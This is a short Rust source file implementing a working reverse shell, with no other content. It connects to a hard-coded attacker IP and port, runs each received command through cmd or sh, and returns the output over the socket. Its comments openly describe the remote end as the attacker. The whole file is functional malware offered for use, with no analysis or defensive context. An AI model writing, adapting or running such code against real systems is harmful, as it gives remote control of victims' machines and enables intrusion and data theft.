use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() {
    // Replace with the attacker's IP address and port
    let target_ip = "192.168.152.235";
    let target_port = "4444";

    // Connect to the attacker's machine
    let connection = format!("{}:{}", target_ip, target_port);
    if let Ok(mut stream) = TcpStream::connect(&connection) {
        let mut buffer = [0; 512];
        loop {
            // Read commands from the stream
            let n = stream.read(&mut buffer).expect("Failed to read from stream");
            if n == 0 {
                break;
            }

            // Execute the command
            let command = String::from_utf8_lossy(&buffer[..n]);
            let output = if cfg!(target_os = "windows") {
                Command::new("cmd")
                    .arg("/C")
                    .arg(command.trim())
                    .output()
                    .expect("Failed to execute command")
            } else {
                Command::new("sh")
                    .arg("-c")
                    .arg(command.trim())
                    .output()
                    .expect("Failed to execute command")
            };

            // Send the command output back to the attacker
            stream
                .write_all(&output.stdout)
                .expect("Failed to write to stream");
            stream
                .write_all(&output.stderr)
                .expect("Failed to write to stream");
        }
    } else {
        eprintln!("Failed to connect to the attacker");
    }
}
